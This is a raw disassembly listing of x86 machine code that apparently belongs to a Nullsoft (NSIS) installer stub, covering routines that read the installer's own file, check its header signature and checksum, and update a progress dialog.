  402b60:	e8 46 38 00 00       	call   0x4063ab
  402b65:	8b c7                	mov    %edi,%eax
  402b67:	5f                   	pop    %edi
  402b68:	5e                   	pop    %esi
  402b69:	c2 04 00             	ret    $0x4
  402b6c:	55                   	push   %ebp
  402b6d:	8b ec                	mov    %esp,%ebp
  402b6f:	8d 45 08             	lea    0x8(%ebp),%eax
  402b72:	50                   	push   %eax
  402b73:	8b 45 08             	mov    0x8(%ebp),%eax
  402b76:	0d 20 00 10 00       	or     $0x100020,%eax
  402b7b:	50                   	push   %eax
  402b7c:	6a 22                	push   $0x22
  402b7e:	e8 a9 ff ff ff       	call   0x402b2c
  402b83:	50                   	push   %eax
  402b84:	a1 3c b8 40 00       	mov    0x40b83c,%eax
  402b89:	ff 70 04             	push   0x4(%eax)
  402b8c:	e8 13 00 00 00       	call   0x402ba4
  402b91:	50                   	push   %eax
  402b92:	e8 30 34 00 00       	call   0x405fc7
  402b97:	f7 d8                	neg    %eax
  402b99:	1b c0                	sbb    %eax,%eax
  402b9b:	f7 d0                	not    %eax
  402b9d:	23 45 08             	and    0x8(%ebp),%eax
  402ba0:	5d                   	pop    %ebp
  402ba1:	c2 04 00             	ret    $0x4
  402ba4:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ba8:	85 c0                	test   %eax,%eax
  402baa:	7c 0d                	jl     0x402bb9
  402bac:	8b 0d c4 47 42 00    	mov    0x4247c4,%ecx
  402bb2:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402bb9:	c2 04 00             	ret    $0x4
  402bbc:	55                   	push   %ebp
  402bbd:	8b ec                	mov    %esp,%ebp
  402bbf:	8d 45 10             	lea    0x10(%ebp),%eax
  402bc2:	50                   	push   %eax
  402bc3:	8b 45 10             	mov    0x10(%ebp),%eax
  402bc6:	0d 20 00 10 00       	or     $0x100020,%eax
  402bcb:	50                   	push   %eax
  402bcc:	ff 75 0c             	push   0xc(%ebp)
  402bcf:	ff 75 08             	push   0x8(%ebp)
  402bd2:	e8 cd ff ff ff       	call   0x402ba4
  402bd7:	50                   	push   %eax
  402bd8:	e8 18 34 00 00       	call   0x405ff5
  402bdd:	f7 d8                	neg    %eax
  402bdf:	1b c0                	sbb    %eax,%eax
  402be1:	f7 d0                	not    %eax
  402be3:	23 45 10             	and    0x10(%ebp),%eax
  402be6:	5d                   	pop    %ebp
  402be7:	c2 0c 00             	ret    $0xc
  402bea:	55                   	push   %ebp
  402beb:	8b ec                	mov    %esp,%ebp
  402bed:	56                   	push   %esi
  402bee:	8b 75 0c             	mov    0xc(%ebp),%esi
  402bf1:	80 3e 00             	cmpb   $0x0,(%esi)
  402bf4:	75 07                	jne    0x402bfd
  402bf6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402bfb:	eb 2c                	jmp    0x402c29
  402bfd:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402c04:	8d 45 10             	lea    0x10(%ebp),%eax
  402c07:	50                   	push   %eax
  402c08:	ff 75 08             	push   0x8(%ebp)
  402c0b:	e8 94 ff ff ff       	call   0x402ba4
  402c10:	50                   	push   %eax
  402c11:	e8 36 33 00 00       	call   0x405f4c
  402c16:	85 c0                	test   %eax,%eax
  402c18:	74 0c                	je     0x402c26
  402c1a:	ff 75 10             	push   0x10(%ebp)
  402c1d:	56                   	push   %esi
  402c1e:	50                   	push   %eax
  402c1f:	e8 0a 00 00 00       	call   0x402c2e
  402c24:	eb 03                	jmp    0x402c29
  402c26:	6a 06                	push   $0x6
  402c28:	58                   	pop    %eax
  402c29:	5e                   	pop    %esi
  402c2a:	5d                   	pop    %ebp
  402c2b:	c2 0c 00             	ret    $0xc
  402c2e:	55                   	push   %ebp
  402c2f:	8b ec                	mov    %esp,%ebp
  402c31:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402c37:	53                   	push   %ebx
  402c38:	56                   	push   %esi
  402c39:	8b 75 10             	mov    0x10(%ebp),%esi
  402c3c:	57                   	push   %edi
  402c3d:	8b fe                	mov    %esi,%edi
  402c3f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402c42:	81 e6 00 03 00 00    	and    $0x300,%esi
  402c48:	50                   	push   %eax
  402c49:	8b c6                	mov    %esi,%eax
  402c4b:	83 e7 01             	and    $0x1,%edi
  402c4e:	0c 08                	or     $0x8,%al
  402c50:	50                   	push   %eax
  402c51:	ff 75 0c             	push   0xc(%ebp)
  402c54:	ff 75 08             	push   0x8(%ebp)
  402c57:	e8 6b 33 00 00       	call   0x405fc7
  402c5c:	85 c0                	test   %eax,%eax
  402c5e:	75 76                	jne    0x402cd6
  402c60:	8b 1d 30 80 40 00    	mov    0x408030,%ebx
  402c66:	eb 1a                	jmp    0x402c82
  402c68:	85 ff                	test   %edi,%edi
  402c6a:	75 4e                	jne    0x402cba
  402c6c:	ff 75 10             	push   0x10(%ebp)
  402c6f:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402c75:	50                   	push   %eax
  402c76:	ff 75 fc             	push   -0x4(%ebp)
  402c79:	e8 b0 ff ff ff       	call   0x402c2e
  402c7e:	85 c0                	test   %eax,%eax
  402c80:	75 17                	jne    0x402c99
  402c82:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402c88:	68 05 01 00 00       	push   $0x105
  402c8d:	50                   	push   %eax
  402c8e:	6a 00                	push   $0x0
  402c90:	ff 75 fc             	push   -0x4(%ebp)
  402c93:	ff d3                	call   *%ebx
  402c95:	85 c0                	test   %eax,%eax
  402c97:	74 cf                	je     0x402c68
  402c99:	ff 75 fc             	push   -0x4(%ebp)
  402c9c:	ff 15 24 80 40 00    	call   *0x408024
  402ca2:	6a 03                	push   $0x3
  402ca4:	e8 30 38 00 00       	call   0x4064d9
  402ca9:	85 c0                	test   %eax,%eax
  402cab:	74 1d                	je     0x402cca
  402cad:	6a 00                	push   $0x0
  402caf:	56                   	push   %esi
  402cb0:	ff 75 0c             	push   0xc(%ebp)
  402cb3:	ff 75 08             	push   0x8(%ebp)
  402cb6:	ff d0                	call   *%eax
  402cb8:	eb 1c                	jmp    0x402cd6
  402cba:	ff 75 fc             	push   -0x4(%ebp)
  402cbd:	ff 15 24 80 40 00    	call   *0x408024
  402cc3:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402cc8:	eb 0c                	jmp    0x402cd6
  402cca:	ff 75 0c             	push   0xc(%ebp)
  402ccd:	ff 75 08             	push   0x8(%ebp)
  402cd0:	ff 15 1c 80 40 00    	call   *0x40801c
  402cd6:	5f                   	pop    %edi
  402cd7:	5e                   	pop    %esi
  402cd8:	5b                   	pop    %ebx
  402cd9:	c9                   	leave
  402cda:	c2 0c 00             	ret    $0xc
  402cdd:	55                   	push   %ebp
  402cde:	8b ec                	mov    %esp,%ebp
  402ce0:	83 ec 40             	sub    $0x40,%esp
  402ce3:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402cea:	75 19                	jne    0x402d05
  402cec:	6a 00                	push   $0x0
  402cee:	68 fa 00 00 00       	push   $0xfa
  402cf3:	6a 01                	push   $0x1
  402cf5:	ff 75 08             	push   0x8(%ebp)
  402cf8:	ff 15 3c 82 40 00    	call   *0x40823c
  402cfe:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402d05:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402d0c:	75 45                	jne    0x402d53
  402d0e:	e8 46 00 00 00       	call   0x402d59
  402d13:	83 3d 34 47 42 00 00 	cmpl   $0x0,0x424734
  402d1a:	b9 3c a0 40 00       	mov    $0x40a03c,%ecx
  402d1f:	75 05                	jne    0x402d26
  402d21:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  402d26:	50                   	push   %eax
  402d27:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402d2a:	51                   	push   %ecx
  402d2b:	50                   	push   %eax
  402d2c:	ff 15 74 82 40 00    	call   *0x408274
  402d32:	83 c4 0c             	add    $0xc,%esp
  402d35:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402d38:	50                   	push   %eax
  402d39:	ff 75 08             	push   0x8(%ebp)
  402d3c:	ff 15 40 82 40 00    	call   *0x408240
  402d42:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402d45:	50                   	push   %eax
  402d46:	68 06 04 00 00       	push   $0x406
  402d4b:	ff 75 08             	push   0x8(%ebp)
  402d4e:	e8 e8 2a 00 00       	call   0x40583b
  402d53:	33 c0                	xor    %eax,%eax
  402d55:	c9                   	leave
  402d56:	c2 10 00             	ret    $0x10
  402d59:	8b 0d d8 f8 41 00    	mov    0x41f8d8,%ecx
  402d5f:	a1 e8 f8 41 00       	mov    0x41f8e8,%eax
  402d64:	3b c8                	cmp    %eax,%ecx
  402d66:	72 02                	jb     0x402d6a
  402d68:	8b c8                	mov    %eax,%ecx
  402d6a:	50                   	push   %eax
  402d6b:	6a 64                	push   $0x64
  402d6d:	51                   	push   %ecx
  402d6e:	ff 15 44 81 40 00    	call   *0x408144
  402d74:	c3                   	ret
  402d75:	55                   	push   %ebp
  402d76:	8b ec                	mov    %esp,%ebp
  402d78:	83 ec 40             	sub    $0x40,%esp
  402d7b:	56                   	push   %esi
  402d7c:	33 f6                	xor    %esi,%esi
  402d7e:	39 75 08             	cmp    %esi,0x8(%ebp)
  402d81:	74 18                	je     0x402d9b
  402d83:	a1 e4 f8 41 00       	mov    0x41f8e4,%eax
  402d88:	3b c6                	cmp    %esi,%eax
  402d8a:	74 07                	je     0x402d93
  402d8c:	50                   	push   %eax
  402d8d:	ff 15 70 82 40 00    	call   *0x408270
  402d93:	89 35 e4 f8 41 00    	mov    %esi,0x41f8e4
  402d99:	eb 76                	jmp    0x402e11
  402d9b:	39 35 e4 f8 41 00    	cmp    %esi,0x41f8e4
  402da1:	74 08                	je     0x402dab
  402da3:	56                   	push   %esi
  402da4:	e8 6c 37 00 00       	call   0x406515
  402da9:	eb 66                	jmp    0x402e11
  402dab:	ff 15 90 80 40 00    	call   *0x408090
  402db1:	3b 05 30 47 42 00    	cmp    0x424730,%eax
  402db7:	76 58                	jbe    0x402e11
  402db9:	39 35 28 47 42 00    	cmp    %esi,0x424728
  402dbf:	74 2d                	je     0x402dee
  402dc1:	f6 05 f4 47 42 00 01 	testb  $0x1,0x4247f4
  402dc8:	74 47                	je     0x402e11
  402dca:	e8 8a ff ff ff       	call   0x402d59
  402dcf:	50                   	push   %eax
  402dd0:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402dd3:	68 54 a0 40 00       	push   $0x40a054
  402dd8:	50                   	push   %eax
  402dd9:	ff 15 74 82 40 00    	call   *0x408274
  402ddf:	83 c4 0c             	add    $0xc,%esp
  402de2:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402de5:	50                   	push   %eax
  402de6:	56                   	push   %esi
  402de7:	e8 7c 24 00 00       	call   0x405268
  402dec:	eb 23                	jmp    0x402e11
  402dee:	56                   	push   %esi
  402def:	68 dd 2c 40 00       	push   $0x402cdd
  402df4:	56                   	push   %esi
  402df5:	6a 6f                	push   $0x6f
  402df7:	ff 35 20 47 42 00    	push   0x424720
  402dfd:	ff 15 38 82 40 00    	call   *0x408238
  402e03:	6a 05                	push   $0x5
  402e05:	50                   	push   %eax
  402e06:	a3 e4 f8 41 00       	mov    %eax,0x41f8e4
  402e0b:	ff 15 48 82 40 00    	call   *0x408248
  402e11:	5e                   	pop    %esi
  402e12:	c9                   	leave
  402e13:	c3                   	ret
  402e14:	55                   	push   %ebp
  402e15:	8b ec                	mov    %esp,%ebp
  402e17:	81 ec 28 01 00 00    	sub    $0x128,%esp
  402e1d:	53                   	push   %ebx
  402e1e:	56                   	push   %esi
  402e1f:	33 db                	xor    %ebx,%ebx
  402e21:	57                   	push   %edi
  402e22:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402e25:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402e28:	ff 15 90 80 40 00    	call   *0x408090
  402e2e:	be 00 bc 42 00       	mov    $0x42bc00,%esi
  402e33:	68 00 04 00 00       	push   $0x400
  402e38:	05 e8 03 00 00       	add    $0x3e8,%eax
  402e3d:	56                   	push   %esi
  402e3e:	53                   	push   %ebx
  402e3f:	a3 30 47 42 00       	mov    %eax,0x424730
  402e44:	ff 15 7c 80 40 00    	call   *0x40807c
  402e4a:	6a 03                	push   $0x3
  402e4c:	68 00 00 00 80       	push   $0x80000000
  402e51:	56                   	push   %esi
  402e52:	e8 83 2e 00 00       	call   0x405cda
  402e57:	8b f8                	mov    %eax,%edi
  402e59:	83 ff ff             	cmp    $0xffffffff,%edi
  402e5c:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  402e62:	75 0a                	jne    0x402e6e
  402e64:	b8 74 a1 40 00       	mov    $0x40a174,%eax
  402e69:	e9 40 02 00 00       	jmp    0x4030ae
  402e6e:	56                   	push   %esi
  402e6f:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  402e74:	56                   	push   %esi
  402e75:	e8 c7 32 00 00       	call   0x406141
  402e7a:	56                   	push   %esi
  402e7b:	e8 a0 2c 00 00       	call   0x405b20
  402e80:	50                   	push   %eax
  402e81:	68 00 c0 42 00       	push   $0x42c000
  402e86:	e8 b6 32 00 00       	call   0x406141
  402e8b:	53                   	push   %ebx
  402e8c:	57                   	push   %edi
  402e8d:	ff 15 78 80 40 00    	call   *0x408078
  402e93:	3b c3                	cmp    %ebx,%eax
  402e95:	a3 e8 f8 41 00       	mov    %eax,0x41f8e8
  402e9a:	8b f0                	mov    %eax,%esi
  402e9c:	0f 86 e5 00 00 00    	jbe    0x402f87
  402ea2:	bb d8 78 41 00       	mov    $0x4178d8,%ebx
  402ea7:	a1 38 47 42 00       	mov    0x424738,%eax
  402eac:	8b fe                	mov    %esi,%edi
  402eae:	f7 d8                	neg    %eax
  402eb0:	1b c0                	sbb    %eax,%eax
  402eb2:	25 00 7e 00 00       	and    $0x7e00,%eax
  402eb7:	05 00 02 00 00       	add    $0x200,%eax
  402ebc:	3b f0                	cmp    %eax,%esi
  402ebe:	72 02                	jb     0x402ec2
  402ec0:	8b f8                	mov    %eax,%edi
  402ec2:	57                   	push   %edi
  402ec3:	53                   	push   %ebx
  402ec4:	e8 5d 04 00 00       	call   0x403326
  402ec9:	85 c0                	test   %eax,%eax
  402ecb:	0f 84 51 01 00 00    	je     0x403022
  402ed1:	83 3d 38 47 42 00 00 	cmpl   $0x0,0x424738
  402ed8:	75 7a                	jne    0x402f54
  402eda:	6a 1c                	push   $0x1c
  402edc:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402edf:	53                   	push   %ebx
  402ee0:	50                   	push   %eax
  402ee1:	e8 af 2d 00 00       	call   0x405c95
  402ee6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402ee9:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402eee:	75 72                	jne    0x402f62
  402ef0:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  402ef7:	75 69                	jne    0x402f62
  402ef9:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  402f00:	75 60                	jne    0x402f62
  402f02:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  402f09:	75 57                	jne    0x402f62
  402f0b:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  402f12:	75 4e                	jne    0x402f62
  402f14:	09 45 08             	or     %eax,0x8(%ebp)
  402f17:	8b 45 08             	mov    0x8(%ebp),%eax
  402f1a:	8b 0d d8 f8 41 00    	mov    0x41f8d8,%ecx
  402f20:	83 e0 02             	and    $0x2,%eax
  402f23:	09 05 e0 47 42 00    	or     %eax,0x4247e0
  402f29:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402f2c:	3b c6                	cmp    %esi,%eax
  402f2e:	89 0d 38 47 42 00    	mov    %ecx,0x424738
  402f34:	0f 87 2c 01 00 00    	ja     0x403066
  402f3a:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402f3e:	75 06                	jne    0x402f46
  402f40:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402f44:	75 3f                	jne    0x402f85
  402f46:	ff 45 f8             	incl   -0x8(%ebp)
  402f49:	8d 70 fc             	lea    -0x4(%eax),%esi
  402f4c:	3b fe                	cmp    %esi,%edi
  402f4e:	76 12                	jbe    0x402f62
  402f50:	8b fe                	mov    %esi,%edi
  402f52:	eb 0e                	jmp    0x402f62
  402f54:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402f58:	75 08                	jne    0x402f62
  402f5a:	6a 00                	push   $0x0
  402f5c:	e8 14 fe ff ff       	call   0x402d75
  402f61:	59                   	pop    %ecx
  402f62:	3b 35 e8 f8 41 00    	cmp    0x41f8e8,%esi
  402f68:	73 0d                	jae    0x402f77
  402f6a:	57                   	push   %edi
  402f6b:	53                   	push   %ebx
  402f6c:	ff 75 fc             	push   -0x4(%ebp)
  402f6f:	e8 1c 36 00 00       	call   0x406590
  402f74:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f77:	01 3d d8 f8 41 00    	add    %edi,0x41f8d8
  402f7d:	2b f7                	sub    %edi,%esi
  402f7f:	0f 85 22 ff ff ff    	jne    0x402ea7
  402f85:	33 db                	xor    %ebx,%ebx
  402f87:	6a 01                	push   $0x1
  402f89:	e8 e7 fd ff ff       	call   0x402d75
  402f8e:	39 1d 38 47 42 00    	cmp    %ebx,0x424738
  402f94:	59                   	pop    %ecx
  402f95:	0f 84 cb 00 00 00    	je     0x403066
  402f9b:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402f9e:	74 2a                	je     0x402fca
  402fa0:	ff 35 d8 f8 41 00    	push   0x41f8d8
  402fa6:	e8 91 03 00 00       	call   0x40333c
  402fab:	8d 45 08             	lea    0x8(%ebp),%eax
  402fae:	6a 04                	push   $0x4
  402fb0:	50                   	push   %eax
  402fb1:	e8 70 03 00 00       	call   0x403326
  402fb6:	85 c0                	test   %eax,%eax
  402fb8:	0f 84 a8 00 00 00    	je     0x403066
  402fbe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402fc1:	3b 45 08             	cmp    0x8(%ebp),%eax
  402fc4:	0f 85 9c 00 00 00    	jne    0x403066
  402fca:	ff 75 f0             	push   -0x10(%ebp)
  402fcd:	6a 40                	push   $0x40
  402fcf:	ff 15 58 81 40 00    	call   *0x408158
  402fd5:	b9 50 b8 40 00       	mov    $0x40b850,%ecx
  402fda:	8b f0                	mov    %eax,%esi
  402fdc:	e8 1d 36 00 00       	call   0x4065fe
  402fe1:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  402fe7:	68 00 b4 42 00       	push   $0x42b400
  402fec:	50                   	push   %eax
  402fed:	e8 17 2d 00 00       	call   0x405d09
  402ff2:	53                   	push   %ebx
  402ff3:	68 00 01 00 04       	push   $0x4000100
  402ff8:	6a 02                	push   $0x2
  402ffa:	53                   	push   %ebx
  402ffb:	53                   	push   %ebx
  402ffc:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  403002:	68 00 00 00 c0       	push   $0xc0000000
  403007:	50                   	push   %eax
  403008:	ff 15 74 80 40 00    	call   *0x408074
  40300e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403011:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  403016:	75 14                	jne    0x40302c
  403018:	b8 30 a1 40 00       	mov    $0x40a130,%eax
  40301d:	e9 8c 00 00 00       	jmp    0x4030ae
  403022:	6a 01                	push   $0x1
  403024:	e8 4c fd ff ff       	call   0x402d75
  403029:	59                   	pop    %ecx
  40302a:	eb 3a                	jmp    0x403066
  40302c:	a1 38 47 42 00       	mov    0x424738,%eax
  403031:	83 c0 1c             	add    $0x1c,%eax
  403034:	50                   	push   %eax
  403035:	e8 02 03 00 00       	call   0x40333c
  40303a:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40303d:	ff 75 f0             	push   -0x10(%ebp)
  403040:	f7 d1                	not    %ecx
  403042:	83 e1 04             	and    $0x4,%ecx
  403045:	a3 ec f8 41 00       	mov    %eax,0x41f8ec
  40304a:	2b c1                	sub    %ecx,%eax
  40304c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40304f:	56                   	push   %esi
  403050:	53                   	push   %ebx
  403051:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  403055:	6a ff                	push   $0xffffffff
  403057:	a3 e0 f8 41 00       	mov    %eax,0x41f8e0
  40305c:	e8 54 00 00 00       	call   0x4030b5
  403061:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  403064:	74 07                	je     0x40306d
  403066:	b8 60 a0 40 00       	mov    $0x40a060,%eax
  40306b:	eb 41                	jmp    0x4030ae
  40306d:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  403071:	89 35 34 47 42 00    	mov    %esi,0x424734
  403077:	8b 06                	mov    (%esi),%eax
  403079:	a3 3c 47 42 00       	mov    %eax,0x42473c
  40307e:	74 06                	je     0x403086
  403080:	ff 05 40 47 42 00    	incl   0x424740
  403086:	6a 08                	push   $0x8
  403088:	8d 46 44             	lea    0x44(%esi),%eax
  40308b:	59                   	pop    %ecx
  40308c:	83 e8 08             	sub    $0x8,%eax
  40308f:	01 30                	add    %esi,(%eax)
  403091:	49                   	dec    %ecx
  403092:	75 f8                	jne    0x40308c
  403094:	a1 dc f8 41 00       	mov    0x41f8dc,%eax
  403099:	6a 40                	push   $0x40
  40309b:	89 46 3c             	mov    %eax,0x3c(%esi)
  40309e:	83 c6 04             	add    $0x4,%esi
  4030a1:	56                   	push   %esi
  4030a2:	68 60 47 42 00       	push   $0x424760
  4030a7:	e8 e9 2b 00 00       	call   0x405c95
  4030ac:	33 c0                	xor    %eax,%eax
  4030ae:	5f                   	pop    %edi
  4030af:	5e                   	pop    %esi
  4030b0:	5b                   	pop    %ebx
  4030b1:	c9                   	leave
  4030b2:	c2 04 00             	ret    $0x4
  4030b5:	55                   	push   %ebp
  4030b6:	8b ec                	mov    %esp,%ebp
  4030b8:	51                   	push   %ecx
  4030b9:	8b 45 08             	mov    0x8(%ebp),%eax
  4030bc:	53                   	push   %ebx
  4030bd:	56                   	push   %esi
  4030be:	33 f6                	xor    %esi,%esi
  4030c0:	3b c6                	cmp    %esi,%eax
  4030c2:	7c 1c                	jl     0x4030e0
  4030c4:	8b 0d 98 47 42 00    	mov    0x424798,%ecx
  4030ca:	56                   	push   %esi
  4030cb:	03 c1                	add    %ecx,%eax
  4030cd:	56                   	push   %esi
  4030ce:	50                   	push   %eax
  4030cf:	a3 dc f8 41 00       	mov    %eax,0x41f8dc
  4030d4:	ff 35 1c a0 40 00    	push   0x40a01c
  4030da:	ff 15 38 81 40 00    	call   *0x408138
  4030e0:	6a 04                	push   $0x4
  4030e2:	e8 d6 00 00 00       	call   0x4031bd
  4030e7:	3b c6                	cmp    %esi,%eax
  4030e9:	0f 8c c8 00 00 00    	jl     0x4031b7
  4030ef:	8d 45 08             	lea    0x8(%ebp),%eax
  4030f2:	6a 04                	push   $0x4
  4030f4:	50                   	push   %eax
  4030f5:	ff 35 1c a0 40 00    	push   0x40a01c
  4030fb:	e8 52 2c 00 00       	call   0x405d52
  403100:	85 c0                	test   %eax,%eax
  403102:	0f 84 9f 00 00 00    	je     0x4031a7
  403108:	ff 75 08             	push   0x8(%ebp)
  40310b:	83 05 dc f8 41 00 04 	addl   $0x4,0x41f8dc
  403112:	e8 a6 00 00 00       	call   0x4031bd
  403117:	8b d8                	mov    %eax,%ebx
  403119:	3b de                	cmp    %esi,%ebx
  40311b:	0f 8c 94 00 00 00    	jl     0x4031b5
  403121:	39 75 10             	cmp    %esi,0x10(%ebp)
  403124:	75 5d                	jne    0x403183
  403126:	39 75 08             	cmp    %esi,0x8(%ebp)
  403129:	0f 8e 86 00 00 00    	jle    0x4031b5
  40312f:	be d8 38 41 00       	mov    $0x4138d8,%esi
  403134:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  40313b:	8b 45 08             	mov    0x8(%ebp),%eax
  40313e:	7c 05                	jl     0x403145
  403140:	b8 00 40 00 00       	mov    $0x4000,%eax
  403145:	50                   	push   %eax
  403146:	56                   	push   %esi
  403147:	ff 35 1c a0 40 00    	push   0x40a01c
  40314d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403150:	e8 fd 2b 00 00       	call   0x405d52
  403155:	85 c0                	test   %eax,%eax
  403157:	74 4e                	je     0x4031a7
  403159:	ff 75 fc             	push   -0x4(%ebp)
  40315c:	56                   	push   %esi
  40315d:	ff 75 0c             	push   0xc(%ebp)
  403160:	e8 1c 2c 00 00       	call   0x405d81
  403165:	85 c0                	test   %eax,%eax
  403167:	74 16                	je     0x40317f
  403169:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40316c:	29 45 08             	sub    %eax,0x8(%ebp)
  40316f:	01 05 dc f8 41 00    	add    %eax,0x41f8dc
  403175:	03 d8                	add    %eax,%ebx
  403177:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40317b:	7f b7                	jg     0x403134
  40317d:	eb 36                	jmp    0x4031b5
  40317f:	6a fe                	push   $0xfffffffe
  403181:	eb 26                	jmp    0x4031a9
  403183:	8b 45 08             	mov    0x8(%ebp),%eax
  403186:	3b 45 14             	cmp    0x14(%ebp),%eax
  403189:	7c 03                	jl     0x40318e
  40318b:	8b 45 14             	mov    0x14(%ebp),%eax
  40318e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403191:	56                   	push   %esi
  403192:	51                   	push   %ecx
  403193:	50                   	push   %eax
  403194:	ff 75 10             	push   0x10(%ebp)
  403197:	ff 35 1c a0 40 00    	push   0x40a01c
  40319d:	ff 15 80 80 40 00    	call   *0x408080
  4031a3:	85 c0                	test   %eax,%eax
  4031a5:	75 05                	jne    0x4031ac
  4031a7:	6a fd                	push   $0xfffffffd
  4031a9:	58                   	pop    %eax
  4031aa:	eb 0b                	jmp    0x4031b7
  4031ac:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4031af:	01 1d dc f8 41 00    	add    %ebx,0x41f8dc
  4031b5:	8b c3                	mov    %ebx,%eax
  4031b7:	5e                   	pop    %esi
  4031b8:	5b                   	pop    %ebx
  4031b9:	c9                   	leave
  4031ba:	c2 10 00             	ret    $0x10
  4031bd:	53                   	push   %ebx
  4031be:	55                   	push   %ebp
  4031bf:	56                   	push   %esi
  4031c0:	8b 35 dc f8 41 00    	mov    0x41f8dc,%esi
  4031c6:	2b 35 48 b8 40 00    	sub    0x40b848,%esi
  4031cc:	57                   	push   %edi
  4031cd:	03 74 24 14          	add    0x14(%esp),%esi
  4031d1:	ff 15 90 80 40 00    	call   *0x408090
  4031d7:	33 db                	xor    %ebx,%ebx
  4031d9:	05 f4 01 00 00       	add    $0x1f4,%eax
  4031de:	3b f3                	cmp    %ebx,%esi
  4031e0:	a3 30 47 42 00       	mov    %eax,0x424730
  4031e5:	0f 8e 2a 01 00 00    	jle    0x403315
  4031eb:	ff 35 ec f8 41 00    	push   0x41f8ec
  4031f1:	e8 46 01 00 00       	call   0x40333c
  4031f6:	53                   	push   %ebx
  4031f7:	53                   	push   %ebx
  4031f8:	ff 35 48 b8 40 00    	push   0x40b848
  4031fe:	ff 35 1c a0 40 00    	push   0x40a01c
  403204:	ff 15 38 81 40 00    	call   *0x408138
  40320a:	89 35 e8 f8 41 00    	mov    %esi,0x41f8e8
  403210:	89 1d d8 f8 41 00    	mov    %ebx,0x41f8d8
  403216:	bd d8 b8 40 00       	mov    $0x40b8d8,%ebp
  40321b:	a1 e0 f8 41 00       	mov    0x41f8e0,%eax
  403220:	bf 00 40 00 00       	mov    $0x4000,%edi
  403225:	2b 05 ec f8 41 00    	sub    0x41f8ec,%eax
  40322b:	3b c7                	cmp    %edi,%eax
  40322d:	7f 02                	jg     0x403231
  40322f:	8b f8                	mov    %eax,%edi
  403231:	be d8 38 41 00       	mov    $0x4138d8,%esi
  403236:	57                   	push   %edi
  403237:	56                   	push   %esi
  403238:	e8 e9 00 00 00       	call   0x403326
  40323d:	85 c0                	test   %eax,%eax
  40323f:	0f 84 c2 00 00 00    	je     0x403307
  403245:	01 3d ec f8 41 00    	add    %edi,0x41f8ec
  40324b:	89 35 68 b8 40 00    	mov    %esi,0x40b868
  403251:	89 3d 6c b8 40 00    	mov    %edi,0x40b86c
  403257:	39 1d 34 47 42 00    	cmp    %ebx,0x424734
  40325d:	74 29                	je     0x403288
  40325f:	39 1d e0 47 42 00    	cmp    %ebx,0x4247e0
  403265:	75 21                	jne    0x403288
  403267:	a1 e8 f8 41 00       	mov    0x41f8e8,%eax
  40326c:	53                   	push   %ebx
  40326d:	2b 05 dc f8 41 00    	sub    0x41f8dc,%eax
  403273:	2b 44 24 18          	sub    0x18(%esp),%eax
  403277:	03 05 48 b8 40 00    	add    0x40b848,%eax
  40327d:	a3 d8 f8 41 00       	mov    %eax,0x41f8d8
  403282:	e8 ee fa ff ff       	call   0x402d75
  403287:	59                   	pop    %ecx
  403288:	b9 50 b8 40 00       	mov    $0x40b850,%ecx
  40328d:	89 2d 70 b8 40 00    	mov    %ebp,0x40b870
  403293:	c7 05 74 b8 40 00 00 	movl   $0x8000,0x40b874
  40329a:	80 00 00 
  40329d:	e8 7c 33 00 00       	call   0x40661e
  4032a2:	85 c0                	test   %eax,%eax
  4032a4:	7c 6a                	jl     0x403310
  4032a6:	8b 35 70 b8 40 00    	mov    0x40b870,%esi
  4032ac:	2b f5                	sub    %ebp,%esi
  4032ae:	74 21                	je     0x4032d1
  4032b0:	56                   	push   %esi
